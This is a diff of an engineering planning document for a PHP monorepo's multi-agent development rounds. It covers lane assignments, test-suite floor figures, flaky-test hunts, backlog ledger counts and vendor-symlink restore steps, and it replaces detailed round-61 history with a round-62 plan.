-| published repo-root | 11,267 / 172,253 / 2 skipped | §0-NOW-62 §2's **published-domain** figures — they stay in their own domain (§2/§4 there); the 2-skip is the cwd property §4 documented. |
-
-The published-domain run showed **two order-dependent flakes** — `CompactModelSummaryTest` viewport
-scroll, `MouseModalGuardTest` null `Mouse\Zone` — each PASSING isolated and both green in the linked
-finals: **E655**, round 62's lane G. Pre-flight before believing any figure: `refresh-deps.php
---status` (rule 62), and name cwd + mode beside every number (rule 59).
-
-### 2. ROUND 62 — THREE FILE-DISJOINT LANES (the ownership map goes VERBATIM into each brief; lanes refuse out-of-lane edits and report seams — the mechanism that ran round 61 clean)
-
-**Lane E — the agent-live wiring.**
-
-| id | why it ranks here |
-|---|---|
-| **E652** | Full `workerProvider` plumbing: `AgentPoolConfig` field + `Chat` fallback → feed **BOTH `ProcessExecutor` AND `AgentWorkerPool`** (the lane-B seam list) + `Bootstrap` feed. AND the doc half is part of the item: the `/workflow run` FAILED-vs-fabricated behaviour change is live and recorded nowhere. |
-| **E653** | The TUI/operator drain for `narrowedGrantWarnings()` — 3-line foreach after executeAll's register loop, IN-STEP with the census roster trio (roster count + uppercase-number anchor word + NUMBER_WORDS map) in the 4 named `tests/Cli` files, or the run reds exactly like lane A's run 1 did. |
-| **E656** | `tests/Agents/AgentManagerTest.php` :1616/:1618/:1714 false anchors — this lane owns the file, so the E651 sweep finishes here too. |
-
-Files owned: `sugar-crush/src/Agents/AgentPoolConfig.php` · `src/Cli/Chat.php` · `src/Cli/Bootstrap.php` ·
-`src/Tui/` (notice wiring ONLY) · `tests/Agents/AgentWorkerPoolTest.php` · `tests/Agents/AgentManagerTest.php` ·
-`tests/Workflows/` run-path tests · the docs file carrying the behaviour note.
-Rules: **NO total-request timeout** (E646 rule); **never remove dormant code** (E660's cross-fork seam
-stays named unless this round's feed wires it).
-
-**Lane G — suite reliability (E655).** Find the polluter behind the order-dependent reds — shared
-ReactPHP `Loop::get()` / global residue is the suspect (`candy-pty`'s `SharedLoopResidue` proves the
-shape). Targeted pair/sequence reproduction first, then fix the **polluter**, ship a regression pin.
-The victims (`CompactModelSummaryTest`, `MouseModalGuardTest`) are **READ-ONLY — never weaken them**.
-If the polluter lives in a lane-E file, report the seam rather than editing.
-
-**Lane H — citation sweep (E657 + E658).** Rule-4 symbol re-anchors across `src/` prose
-(`SglangProvider`, `VertexProvider` ×6, `Runtime`…) and the ~20 test dirs carrying the `.php:NNN`
-pattern — **EXCLUDING lane-E-owned files**. Prose only; floor-exact discipline (round 61's lane D is
-the model: 4/4 false-or-drifted, zero residual, EXACT floor). **NEVER cite a constant for a per-file
-assertion delta (E634).** Reconcile `SymbolCitationDriftTest` at merge for every lane.
-
-### 3. ROUND-63 CARRY LIST — record, do NOT schedule here
-
-Phase 9 containment (design settled round 40 — layered detach-always + PTY-opt-in, no askpass; needs
-`Chat.php` → goes AFTER lane E finishes owning it) · **E633** wants its own round · **P2.9 / P3.3 /
-P6.5 / P8.15** unchanged from §0-NOW-62 §8(b) · `crush_feat_plan.md`'s two human attestations unchanged
-(neither blocks anything) · `/home/sites/crush-lane-{a,b,c,d}` sandboxes are **deletable once round 62
-merges**.
-
-### 4. LEDGER AFTER ROUND 61
-
-645 → **656** entries: **CLOSED +15** (E575, E631, E632, E636, E637, E639, E641, E642, E643, E644,
-E645, E646, E647, E650, E651 — fixing commits cited per row), **E649 → PARTIAL** (doc+accessor landed,
-wiring is the live gap), **E652–E662** filed (11). Actionable **157**. The `### E652+` headings in
-`crush_code_hardening_backlog.md` are not yet minted — mint them at the next backlog-touching close.
+**Lane naming (in force):** two-letter ids, FIRST letter = round-group, SECOND = lane within the round
+(r64=a*, r65=b*, r66=c*, r67=d*, r68=e*, **r69=f***). Branch `lane/<id>`, sandbox `crush-lane-<id>`, artifacts
+`/home/sites/crush-r61-artifacts/<id>/` (the artifacts root keeps its round-61 name across rounds).
 
 ---
 
-## 0-NOW-62 (now superseded by 0-NOW-63 above — ROUND 61 CLOSED at `0549736d4`; its §6 lane map and §2 figures are dead history, its §3/§4/§4b machinery and rules 59–62 survive). THE PROMPT PLAN IS DONE — ROUND 61 WAS UNBLOCKED, AND EVERY FIGURE IN §0-NOW-61 WAS DEAD
+## APPENDIX III — VENDOR & SUITE MACHINERY (surviving §0-NOW-62 sections + the vendor-restore block)
 
-**Written 2026-09-10 by a supervisor session that did no code work — it only measured. Nothing below
-is carried from §0-NOW-61 except where it says so.**
-
-⚠️ **TWO BASES, AND THE DIFFERENCE IS STATED RATHER THAN SMOOTHED.** This section was opened at
-`3bf356bd6` and the floor in §2 was measured there. **The user then committed `170bd49be` ("update")
-mid-session and pushed it** — caught by a triage agent reporting a HEAD that did not match its brief,
-not by the supervisor. MEASURED: `git diff 3bf356bd6..170bd49be` is **root `composer.lock` only,
-11 insertions / 11 deletions, nothing under `src/` or `tests/` in any package.** So the §2 floor and
-every triage verdict below hold at `170bd49be` as well. **Current base: `170bd49be`, clean, pushed.**
-Re-derive rather than trusting this paragraph if anything else has landed since — the user commits
-into this working copy directly, so local-vs-remote moves without the supervisor doing anything.
-
-### STANDING ORDER — run this plan to completion
-
-**You have been handed this file to run the plan to the end. That is the instruction. Do not stop
-at a round boundary to ask whether to continue.** Concretely:
-
-1. Work §0-NOW-62 §6's ranked lanes as round 61. Close it (worklog entry + a new `0-NOW-63`
-   section + backlog id renumber), then **immediately choose round 62** from what round 61 files,
-   and keep going. This file's `## 2. The loop` and `## 3. Sequencing rules` further down carry the
-   per-bundle mechanics and are still current; **§8 of THIS section is what "the end" means.**
-2. **Rewrite this section and append to `docs/plans/crush_code_worklog.md` at every round close.**
-   Not at the end of a session — at each close. If you are running out of context, doing that is
-   the last and highest-value thing you do.
-3. **Decide the ordinary things yourself.** Lane composition, merge order, whether a finding earns
-   a fix or a backlog entry, whether an agent's work meets the bar. You are the supervisor.
-
-**STOP AND ASK only for these:**
-
-- The **E639 decision** in §7 below, if you are not willing to take the recommendation there.
-- Anything that would **remove** unfinished, dormant, unwired or unreachable code. The user's
-  standing rule is *fix it or wire it, never delete it*. Move and consolidate are fine.
-- A **`git push`**, or any change to `prompt_plan.md` / `prompt_resume.md` / `prompt_worklog.md` /
-  `prompt_expand.md` — that plan is closed and this one does not own its files.
-- A **blanket total-request timeout on an LLM call.** Standing user rule: completions may
-  legitimately run tens of minutes. `connect_timeout` is fine; a total cap is not.
-
-### 1. WHAT CHANGED WHILE THIS PLAN WAS PARKED
-
-`prompt_plan.md` ran to completion and **is done: 65/65 steps + 6/6 authorized follow-ups merged**,
-final merge `e4416c32b`. §0-NOW-61's headline — *"the next thing to run is NOT this plan"* — is
-therefore **spent**. Round 61 is unblocked.
-
-- **MEASURED 2026-09-10:** `master` is `3bf356bd6`, working tree **clean**, and
-  `origin/master` is the same sha. The "PUSH AUTHORIZATION" item `prompt_resume.md` still lists as
-  awaiting the user **has been satisfied** — nothing is unpushed.
-- ⚠️ **The prompt program wrote into `docs/plans/crush_code_hardening_backlog.md` twice** —
-  `d22e2e2c4` and `de6c23dc1`, both on the `prompt/FU4` branch, annotating **E31** CLOSED-with-
-  variant-shape — despite declaring `docs/plans/crush_code_*.md` read-only to itself. So the backlog
-  moved under this plan. Nothing else in `docs/plans/crush_code_*` was touched.
-- **MEASURED:** `git worktree list` shows the main checkout only. `/home/sites/crush-lane-{a,b,c}`
-  **do not exist**, and neither do the `prompt-step-FU1/FU2/FU3/FU5/FU6` worktrees
-  `prompt_resume.md` records as "RETAINED DELIBERATELY". See §4b.
-
-### 2. THE FLOOR — OBSERVED at `3bf356bd6`, and READ §3 BEFORE QUOTING IT
-
-| package | floor | provenance |
-|---|---|---|
-| **sugar-crush** | **11,267 / 172,253 / 0F / 0E / 2 skipped / EXIT 0** | **OBSERVED 2026-09-10** at `3bf356bd6`, PHP 8.3.6, **cwd = repo root**, **vendor mode = `published` (0/18 symlinked)**: `php sugar-crush/vendor/bin/phpunit -c sugar-crush/phpunit.xml --colors=never </dev/null` |
-| tools/tests · candy-pty · candy-core · candy-flip · candy-mosaic | **NOT MEASURED at this base.** | §0-NOW-61's figures for these are now two programs old. An inference, not an observation. **If a lane touches one, it MEASURES it.** |
-
-`prompt_resume.md` records its own terminal floor as **11,267 / 172,237 / 0F / 0E / 2 skipped /
-EXIT 0** at `e4416c32b`, measured MASTER-DIRECT. Diffed against the observed row above:
-
-**TESTS MATCH EXACTLY — 11,267 both sides. ASSERTIONS DO NOT: +16 (172,237 → 172,253), AND THE
-MECHANISM IS UNKNOWN. Recorded, not explained.** The three commits between the two bases
-(`7a5631f5b`, `2ab5d4431`, `3bf356bd6`) touch **only** root-level `prompt_worklog.md` (+70),
-`prompt_plan.md` (+2) and `prompt_resume.md` (16 lines modified) — **nothing under `src/` or
-`tests/` at all**, so E634's "editing a `src/` doc-block moves the total via `GlobFigureDrift`'s
-per-paragraph census" does not explain it. Two unfalsified hypotheses, in order of prior:
-
-1. **Vendor mode.** This run is `published`; `prompt_resume.md` does not name its mode, and a guard
-   that walks `vendor/sugarcraft/*` would read a different tree under `linked`. This is the reason
-   §3 item 3 now demands the mode beside every figure.
-2. **A guard whose scope includes root-level markdown.** The 16-line modification to
-   `prompt_resume.md` and the +16 are the same number, which is either the answer or a coincidence
-   worth one command to rule out. E634's negative control proved `docs/plans/` is out of scope for
-   the `src/`-paragraph census; **the repo ROOT was never tested.**
-
-**The instrument that settles it is a per-test `--log-junit` diff between two complete runs** — the
-same one that localised round 60's unexplained `+1` to `GlobFigureDriftTest` and its per-paragraph
-census. Do that before the first round-61 merge reconciliation, or the +16 will be re-discovered as
-a mystery inside a lane's arithmetic where it is far more expensive. **Until it is localised, treat
-172,253 as the anchor and 172,237 as a figure from a differently-configured tree — not as evidence
-that anything regressed.** Nothing failed, nothing errored, and both runs are `EXIT 0`.
-
-🔴 **§0-NOW-61's `10351 / 160648` is dead. Do not let it into a brief.** Its own item 1 predicted
-exactly this and gave the reason it fails silently: *a floor paragraph is data to the script and an
-instruction to the agent, and no static check crosses that boundary.* Round 60 shipped round 58's
-floor to three lanes and `node --check`, nine rendered prompts and every dry-run passed over it.
-**Diff the new floor block against this table before launching. Every round.**
+Declared still in force by every live header since. The other §0-NOW-62 sections (§1, §2, §5, §6, §7)
+were round-61 state history and were trimmed; §8 is kept with its (b) list replaced by a pointer per
+the 2026-09-12 adjudication.
 
 ### 3. 🔴 THE VENDOR CLOSURE WAS SILENTLY BROKEN, AND IT COST THIS SESSION A WHOLE SUITE RUN
 
@@ -1333,6 +437,7 @@ Three things follow, and the third is the one that will bite a future round:
    `candy-pty` figure measured locally from here is a `published`-mode figure, and §0-NOW-61's carried
    `644 / 1785 / 16 / 1 warning` predates all of it.
 
+
 ### 4. THE SKIP-COUNT CANARY IS CWD-DEPENDENT, AND THAT WAS NEVER WRITTEN DOWN
 
 §0-NOW-61 predicted this canary would misfire and was right, but named the wrong mechanism. It is not
@@ -1356,6 +461,7 @@ directories, and the skip count is a function of which one you use.**
   conclude their sandbox is broken when it is not. Confirm all three at your own base before writing
   them.
 
+
 ### 4b. THE LANES ARE GONE — RE-CUT FROM SCRATCH, THERE IS NOTHING TO REFRESH
 
 §0-NOW-61 says the three lane dirs are `cp -a` copies at `09139a807` and are "far behind". They are
@@ -1377,151 +483,28 @@ printed a correct-looking 18 twice while every entry was a real directory. **Nev
 `composer install`/`update` in a lane root.** Re-derive the two expected counts if a sibling dep was
 added; they are carried from §0-NOW-61 and the sugar-crush one is now independently confirmed at 18.
 
-### 5. LINE NUMBERS IN OPEN BACKLOG ENTRIES HAVE ROTTED — AND SO HAS `crush_code.md`'s OWN SCORECARD
 
-**The backlog half**, unchanged from §0-NOW-61 and now actually true rather than predicted: the
-prompt plan's phases 4, 8 and 9 rewrote `sugar-crush/src/Chat.php`, `src/Context/ContextCompactor.php`
-and `src/Tools/BuiltIn/Bash.php`, and it added ~11 files under `src/`. Open entries quote those files
-**with line numbers and inline code**. They did not go red; they went **stale**, which is worse.
-**Re-verify any entry against the tree before scheduling it.** Same for entries citing `src/Agents/*`
-and `src/App/App.php`, which round 60 rewrote itself.
+## ⚠️ VENDOR STATE IS NOW A THING TO CHECK, and it silently changes what "green" means
 
-🔴 **The `crush_code.md` half is new, and it cuts the other way — the plan UNDER-states its own
-progress by twelve items.** `crush_code.md`'s Phase 0-9 checkmarks were last maintained around its
-round 32/40. **MEASURED 2026-09-10, agent-verified with file:line against the tree**, twelve items
-carrying no `✅` are in fact **DONE**:
+The mid-round 2026-08-19 incident is landed history; the durable fact survives verbatim — something
+ran `composer update` and swapped `sugar-crush/vendor/sugarcraft/*`'s symlinks for published copies,
+with no signal except a skip count moving 1 → 2 (`GitignoreAwarenessTest` self-skips when there are
+no symlinks). **A 2-skip run means you are not testing the monorepo.**
 
-| item | evidence |
-|---|---|
-| P3.1 `Chat::$inputBuf` → candy-forms | `src/Chat.php:159` `public readonly TextArea $input` (`$inputBuf` kept as a read-only compat mirror, `:153`) |
-| P3.2 `Tui\Pane::next()` → `FocusRing` | `src/Tui/Pane.php:66-68` `FocusRing::ofStrict(...)`, reverse walk `:91`; landed `c47187812` |
-| P3.4 `candy-sprinkles\Table` | `src/Commands/TranscriptTable.php:10`, consumed by `AgentsCommand.php:137`, `McpAuthCommand.php:135` |
-| P3.5 `strlen()` padding | `src/Tui/SplitLayout.php:241-249` and `src/Tui/AgentViewPane.php:202,288-297` now use `Width::padRight()` |
-| P5.6 model-driven summarization | `src/Chat.php:9487-9499`; heuristic survives only as the no-provider fallback (`ContextCompactor.php:1325`). Backlog **E21 CLOSED** |
-| P5.10 EnvironmentBlock OS line | `src/Context/EnvironmentBlock.php:725,756-768`; the absent "additional working directories" line is a pinned decision (`:739`, test `:177-181`) |
-| P6.6 `--model` / `--permission-mode` | `src/Cli/ArgvParser.php:385,417,442`; `bin/sugarcrush:154,338-341` |
-| P7.6 `docs/ARCHITECTURE.md` | `sugar-crush/docs/ARCHITECTURE.md:132-142` — the "`App` WEARS TWO HATS" warning exists verbatim |
-| P8.4 split-pane compositor | WIRED: `src/Tui/Renderer.php:831` calls `AgentSplitColumn::render()` from live `renderView()`; decision recorded `src/Renderer.php:187-197` |
-| P8.8 repo-map | `src/Context/RepoMapBlock.php`, injected once per prompt at `src/Runtime.php:2637` |
-| P8.9 `Grep` instruction loader | `src/Tools/BuiltIn/Grep.php:41,101,114,400-417`; constructed with the loader at `src/Cli/Bootstrap.php:5687` |
-| P8.10 + P8.11 git-diff · monorepo-parent `loadRoot()` | `src/Context/EnvironmentBlock.php:1008-1010`; `src/Context/InstructionFileLoader.php:210` → `loadAncestorRoots()` `:394` |
+Restore local wiring with the documented loop, and note it is `sugarcraft/*` scoped so third-party
+versions do not move:
 
-⚠️ **Two of those read OPEN to a careless re-checker and would send an agent to redo finished work.**
-`grep strlen src/Tui/AgentViewPane.php` still returns `:534` and `:550` — they are a four-byte emoji
-sequence test, not padding, so **P3.5 is done**. And **P6.5 is one item covering two unrelated
-features that landed asymmetrically**: `statusLine` shipped (`src/Config/StatusLineCommand.php`,
-user-tier-only per `LayeredSettings.php:216-241`); the **keybindings remap did not** —
-`KeyBindingRegistry` is still wholly static and `src/Config/`/`Bootstrap.php` have zero hits for
-`keybinding`/`remap`.
+    php tools/check-path-repos.php --fix --strict-closure
+    cd sugar-crush && composer update 'sugarcraft/*' --quiet
+    cd .. && git checkout -- '*/composer.json'      # NEVER commit these
+    php tools/check-path-repos.php --no-lib-path-repos   # must exit 0
 
-**So the 82-item plan is ~76 done, not the 57 its `✅` marks imply.** The six genuinely open items
-are in §8. Do not re-derive this from the checkmarks; they are not maintained.
+`vendor/` is gitignored, so reverting the manifests keeps the symlinks AND a clean tree. **Tell
+every agent not to run `composer install`/`update`** — it silently undoes this.
 
-**`crush_feat_plan.md` is CLOSED and needs no further work.** MEASURED 2026-09-10, step by step:
-**76/76** (W0.S1 + Waves 1-4; there is no Wave 5 — Wave 4 *is* the final wave). `W3.S6a`/`S6b` are the
-only SUPERSEDED rows and were correctly never run — an attempt at them deleted 3,504 lines and was
-reverted in `e995acf6`; the W3.M1-M4 pane-shell migration replaced them and shipped
-(`bin/sugarcrush:424` boots `Bootstrap::app()`, not bare `Chat`). Two soft process attestations
-remain and are carried in §8.
-🔴 **`.sugar-crush-build/feat-plan-progress.json` still reads `W2: in_progress, W3: not_started,
-W4: not_started`, frozen 2026-08-11. It is WRONG.** Hand it to an agent and it rebuilds finished
-work. Trust the tree.
+---
 
-### 6. ROUND 61 — RANKED, THREE FILE-DISJOINT LANES
-
-Round 60 filed 21 entries as **E631-E651**. Ranked by *live fail-open first, suite-integrity second,
-prose last*. The three lanes below own disjoint file sets; the ownership map is the deliverable, so
-copy it into each brief verbatim and let the lane refuse anything outside it (that mechanism produced
-zero out-of-lane edits in round 59 and caught a mis-scoped brief — rule 51).
-
-**Lane a — the sub-agent grant family. The live fail-open cluster, and the round's headline.**
-
-| id | why it ranks here |
-|---|---|
-| **E644** | `AgentManager::executeAll()` — the **live parallel path**, two production callers (`Chat::executeAgents()`, `WorkflowEngine`'s parallel stages) — calls neither `resolveGrantedTools()` nor `refuseCallOutsideGrant()`. Agents 2..n of a mixed workflow stage are governed by **agent 1's declaration**. The correct shape is a per-agent `CompleteRequest` built inside the pool, which the pool already has a seam for. |
-| **E639** | Round 60 wired the grant but `Bootstrap::agentManager()` supplies no registry, so a launched sub-agent still reaches its provider with `tools: null`. **Gated on the §7 decision — read it before touching this.** |
-| **E643** | The sub-agent **skill** grant has the identical fail-open shape and was not fixed: a missing skill is silently skipped while the preset prompt still tells the model it was granted. |
-| **E645** | `ForeignAgentPresetRegistry` imports `Bash(git:*)` (Claude Code's prefix dialect) verbatim with no translation, producing a declaration that is well-formed, passes every check, and **matches nothing** — so after the grant lands, the tool is granted by name and every call refused by argument. |
-| **E642** (remainder) | Bare-name validation now covers the six built-ins only; a typo in a **user or foreign** preset is caught by nothing. Needs §7's decision first (a preset naming a tool the operator disabled must warn, not refuse). |
-
-Files owned: `sugar-crush/src/Agents/AgentManager.php` · `src/Agents/AgentWorkerPool.php` ·
-`src/Agents/AgentPresetRegistry.php` · `src/Agents/ForeignAgentPresetRegistry.php` ·
-`src/Cli/Bootstrap.php` · `tests/Agents/AgentManagerTest.php` ·
-`tests/Agents/AgentDefinitionTest.php` · `tests/Agents/AgentWorkerPoolTest.php` ·
-`tests/Agents/ForeignAgentPresetRegistryTest.php`.
-
-**Lane b — the worker/executor liveness family. One live crash, one guaranteed suite red.**
-
-| id | why it ranks here |
-|---|---|
-| **E641** | `WorkflowEngine` puts tool-name **STRINGS** into `CompleteRequest::$tools`, and every provider that reads that field calls `->name()` on the entries. This is a fatal on a shipped command, not a hygiene note. Fix in `WorkflowEngine` (resolve against the registry) rather than by loosening `CompleteRequest`. 🔴 **THE ENTRY UNDERSTATES ITS OWN SCOPE — MEASURED 2026-09-10.** It cites only the parallel-stage `$defaultRequest`, but `tools: $task->tools` reaches `CompleteRequest` at **seven** sites in `WorkflowEngine.php` (`:1039`, `:1062`, `:1151`, `:1254`, `:1409`, `:1421`, `:1438`), and `:1297`/`:1317` do the same with `$verifier->tools`. **Scope the lane to all of them, not to `executeParallelStage()`.** |
-| **E650** | The parent writes `execute` into a pipe whose child may already be gone → `fwrite(): Broken pipe`. `phpunit.xml` sets `failOnWarning="true"`, so **this reds the suite for the wrong reason** the moment a test provokes it. Cheap: detect the dead child and return the `AgentResult` the caller already expects. |
-| **E649** | Nothing in `src/` can give a sub-agent worker a provider — and the reachable case is the shipped `/workflow run`, which now returns a **FAILED** agent where it previously returned Completed carrying fabricated text. That behaviour change is live and is written down nowhere. ⚠️ **Record and name the seam; do NOT edit `AgentWorkerPool` — it is lane a's this round.** |
-| **E647** | A `ProcessExecutor` worker runs with `tools: null` and nothing surfaces it: the agent can reason but cannot act. Decide the wire format (name+schema rehydrated child-side, or RPC back to the parent) — this blocks lane a's grant ever reaching a worker. |
-| **E646** | The live worker cannot heartbeat through a **non-streaming** provider call; the 15s `HEARTBEAT_TIMEOUT_SECS` then SIGKILLs a correctly-working child. Latent (nothing configures a `workerProvider`) but it goes live with E649. 🔴 **Not to be "solved" by capping the request — standing user rule.** |
-
-Files owned: `src/Agents/ProcessExecutor.php` · `src/Workflows/WorkflowEngine.php` ·
-`src/Workflows/WorkflowTask.php` · `src/Providers/CompleteRequest.php` ·
-`tests/Agents/ProcessExecutorTest.php` · `tests/Workflows/`.
-
-**Lane c — corpus-scanner integrity. The plan's own instrument is unsound, and sixty rounds of green said nothing.**
-
-| id | why it ranks here |
-|---|---|
-| **E631** | A mis-namespaced file under `src/` takes the **whole PHPUnit process down rc 255** before any assertion runs — Composer's `includeFile()` is a plain `include`, so the triple `*_exists()` probe re-executes the file and PHP fatals on redeclaration. The doc-block claims the case is "reported rather than thrown on"; the synthetic probe tree is immunised with `require_once` and the real tree is not. **Reproduce the fatal as an acceptance test first**, then pick `token_get_all()` resolution (a) or a guarded `include_once` (b). |
-| **E636** | The only instrument that could still *report* E631's case — the `token_get_all()` balance — is declared **after** the reflection census, so it never runs. Subordinate to E631; if E631 defers again, move it above and pin the ordering with a comment (not `@depends` — they are not dependent, they are differently survivable). |
-| **E632** | `BuiltInToolCorpus.php`'s doc-block is the fifth restatement of the `src/` census, and at least two copies read as **live present-tense measurements**, stale by nineteen. ⚠️ **Sweep all of `tests/Tools/` BEFORE widening the no-restatement scanner's file domain**, or the widening lands red on prose that has nothing to do with `RepoMapBlock`. Widen the DOMAIN, never the ALPHABET (E635 measured that and rejected it — one row already collides). |
-| **E637** | `declaredTypes()` cannot see a conditionally-declared type, so a `Tool` implementor declared inside an `if` is invisible to **all three** instruments. Decide whether depth-zero is the policy or the limitation and pin it in **both polarities** — rule 14: a guard must be able to state what it cannot see. |
-
-Files owned: `tests/Tools/BuiltInToolCorpus.php` · `tests/Tools/BuiltInToolCorpusTest.php` · a
-read-and-elide sweep over `tests/Tools/`.
-
-**Supervisor, pre-round, by hand — do NOT give this to a lane.** **E651**: a doc-block in
-`src/Tui/Renderer.php` reasons about `ProcessExecutor` by line number (`:81`/`:235`) and round 60
-moved everything below that constructor. Rule 4: cite symbols. One file no lane owns; land it before
-cutting the sandboxes, the way round 48's `uniqid` sweep was. ⚠️ **NOT "trivial" — the entry's own
-word is wrong, MEASURED 2026-09-10.** The citation is not approximate, it is **false**:
-`Renderer.php:727` calls `:81`/`:235` blocking `stream_select()` calls; `:81` is now a doc-block line
-and `:235` a `return` tail. **The real calls are `:116` and `:270`.** A reader following that
-doc-block today is sent to two statements that do not block.
-
-**Deliberately NOT scheduled for round 61, with the reason:** **E633** (sweep for unpinned
-qualitative conclusions — real, but large and vaguely bounded; it also ate its own fix twice, so it
-wants a round of its own) · **E634** (a retraction, no code: **do not cite a constant for the
-per-file assertion delta** — fold that sentence into every brief instead) · **E635** (measured and
-rejected; no fix exists that is better than the narrow alphabet) · **E638** (no fix; re-measure the
-bounds table only if `MAX_SECTION_BYTES`/`MAX_SOURCE_FILES` moves, and treat a red as an instruction
-to rewrite `RepoMapBlock`'s design note, never to loosen the bound) · **E640** (needs a preset whose
-grant upper bound actually matters; none ships today) · **E648** (contained by the transport;
-revisit if the worker protocol gains a second writer).
-
-### 7. THE DECISION THAT GATES LANE A — E639, AND WHY THE "ONE-LINER" IS A TRAP
-
-E639's own text withdraws its first sentence, and this is the single most likely thing a future agent
-would act on without reading further. **The obvious fix —
-`toolRegistry: self::tools($root, ...)` — is a BREAKING CHANGE.** `resolveGrantedTools()` *refuses*
-a declaration matching no tool in the registry rather than intersecting, which is correct only while
-the registry is the UNFILTERED ceiling. `Bootstrap::tools()` returns `filterToolSet($tools)`, already
-narrowed by the operator's `allowedTools`/`disabledTools` — and `filterToolSet()`'s own doc-block
-states the opposite policy in as many words. MEASURED on PHP 8.3.6 against the eleven-tool ceiling:
-`disabledTools: ["Bash"]` makes **5 of 6** built-in presets throw; `disabledTools: ["*"]` makes 6 of 6.
-
-Three options, recorded in E639 and reproduced so the decision can be made from this file alone:
-
-1. **Intersect when the shortfall is the session's own narrowing; refuse when the tool never
-   existed.** Honest, and expensive — telling those apart needs the unfiltered set, which
-   `filterToolSet()` currently discards, so `Bootstrap` must pass both.
-2. **Keep the refusal, pass the unfiltered ceiling.** Cheap, but a sub-agent's roster then ignores
-   `disabledTools` — a widening, the exact shape round 60 was fixing.
-3. **Keep the refusal, pass the filtered set, accept the crash as the signal.** Only defensible with
-   a message naming `disabledTools`; today's message sends the reader hunting for a typo.
-
-**RECOMMENDATION: option 1.** It is the only one that neither widens the grant nor hard-fails a
-configuration this codebase documents as intentional. **If the user has not ruled otherwise by the
-time lane a reaches this, take option 1 and record the decision in `resolveGrantedTools()`'s
-doc-block** — that recording is part of the item, not optional.
-`AgentManagerTest::testAPolicyNarrowedRegistryIsIndistinguishableFromATypo` is the tripwire and names
-this decision in its failure message.
+## (moved) §0-NOW-62 §8 — WHAT "COMPLETE" MEANS — THE PATH TO THE END
 
 ### 8. WHAT "COMPLETE" MEANS — THE PATH TO THE END
 
@@ -1568,16 +551,7 @@ real remaining backlog is about a quarter of what its 645 entries implied.
    §0-NOW-61 recorded.** `E78` carries two extra sub-entries stamped `E78b`/`E78c`.
    **645 headings, 643 distinct ids, 651 ids referenced.**
 
-**(b) The six genuinely open `crush_code.md` plan items.** MEASURED 2026-09-10, agent-verified:
-
-| item | state |
-|---|---|
-| **Phase 9, entire phase** — interactive-prompt containment | **UNTOUCHED.** `src/Tools/Concerns/CapturesProcessOutput.php:82` is a bare `@proc_open(...)` — no env array, no `setsid`. Zero hits in `src/` for `GIT_TERMINAL_PROMPT`, `DEBIAN_FRONTEND`, `PAGER`, `SYSTEMD_PAGER`, `sudo -n`; the only `posix_setsid()` is the unrelated background-session daemon. No `interactive` param on `Bash.php`, no `candy-pty` on the tool path, no PTY regression test. **The design decisions were already settled in round 40 and stand: layered (A) detach always + (C) PTY opt-in, the opt-in an optional parameter and NOT a second tool, and no askpass — the interactive PTY does not accept secrets at all.** Use `Chat::withLaunchNotices()` for the refusal text rather than inventing a second seam: a detached child's refusal must reach a user who cannot see stderr, and a stderr warning was measured living only **0.47 s** before `\e[?1049h` takes the screen. |
-| **P8.13** — model-callable `Task` tool | `src/Tools/BuiltIn/` has no `Task.php`; `src/Renderer.php:164-167` states nothing in `src/`/`bin/` calls `createSubAgent()`/`executeSubAgent()` because no such tool exists. The `src/Agents/Task.php` name collision still stands. **Sequence this AFTER round 61's lane a and lane b** — it is the consumer of exactly the grant (E639/E644) and worker (E647/E649) seams they settle. |
-| **P2.9** — unified `crush-plugin.json` + `PluginLoader` | Zero hits anywhere in `src`/`bin`/`tests`/README. Deliberately sequenced last in the plan; keep it there. |
-| **P3.3** — `withClickOutsideDismiss()` on overlays | `Veil::withClickOutsideDismiss()`/`isClickOutside()` exist in `sugar-veil/src/Veil.php:195,297` and are used by nothing. `grep -rni clickoutside sugar-crush/src/` is empty; the one test that names it asserts a **no-op**. `Chat::mouseCaptureRefusal()` is adjacent work, not this item. |
-| **P6.5** (half) — keybindings remap table | `statusLine` shipped; the remap did not. `KeyBindingRegistry` is wholly static. |
-| **P8.15** — file-watching / stale-file signal | Standing flag, no fix ever proposed. `grep -n 'filemtime\|mtime\|stale' src/Tools/BuiltIn/{Read,Edit}.php` is empty. |
+(b) open plan items: see §0-NOW live section + docs/plans/crush_code_hardening_backlog.md — a plan's own checkmarks are a claim not a state (rule 60).
 
 **(c) Two process attestations inherited from the closed `crush_feat_plan.md`,** neither of which is
 code: **W4.S5**'s full-suite-vs-baseline confirmation has no *current* artifact (its recorded
@@ -1586,4005 +560,11 @@ plan's **manual real-terminal E2E pass** (kitty/iTerm2/sixel, mouse tab-switch, 
 `/doctor` protocol report) has no recorded result. It was explicitly never gated by a review agent.
 Both need a human at a real terminal; neither blocks (a) or (b).
 
-### NEW STANDING RULES
-
-- **59 — name the cwd with every suite figure, and the skip count with it.** The prompt plan spent
-  five days on a CI red nobody saw because its figures were measured from `sugar-crush/` without
-  saying so. This plan's own skip canary carries the same unstated precondition. A figure without a
-  cwd is not a measurement.
-- **60 — a plan's own checkmarks are a claim, not a state.** `crush_code.md` under-stated its
-  progress by twelve items and `.sugar-crush-build/feat-plan-progress.json` over-stated its remaining
-  work by two whole waves, in the same tree, on the same day. Both were settled in minutes by
-  grepping the source. Re-derive before scheduling; never schedule from a marker.
-- **61 — a parked plan rots in its ENVIRONMENT, not only in its prose.** §0-NOW-61 correctly
-  predicted its floor and line numbers would rot. What it did not predict is that the sandboxes and
-  worktrees it described as merely stale would be **gone**. Before believing any environmental fact
-  in a resume section, run the check rather than reading the sentence.
-- **62 — prove the vendor closure BEFORE the suite, not after a red.** A tree can be short of
-  required packages entirely, not merely swapped to Packagist, and it still produces a plausible test
-  count and a "good" skip count. `refresh-deps.php --status` is the only instrument that sees it.
-  A figure whose closure was not checked first is not a floor.
 
 ---
 
-## 0-NOW-61 (now superseded by 0-NOW-62). ROUND 60 CLOSED (floor 10351) — the `src/` census is decoupled, and the next thing to run is NOT this plan
-
-> ⚠️ **SUPERSEDED 2026-09-10 by §0-NOW-62 above. Read that first.** This section's *reasoning* is
-> intact and several of its predictions came true, so it is kept. Three things in it are now FALSE
-> and are corrected there: (1) its headline instruction *"the prompt plan runs next, do not launch a
-> crush_code round"* — that plan closed 65/65 + 6/6 at `e4416c32b` and round 61 is unblocked; (2) its
-> floor table; (3) its lane-sandbox description — the lanes do not exist at all. Its "WHAT IS
-> OUTSTANDING WHEN YOU PICK THIS UP" list below is spent except for items 4 and 5.
-
-**CLOSED at `09139a807`, base `88374be64`.** Run `wf_e28fe5ce-ce4`, 9 agents, zero errors.
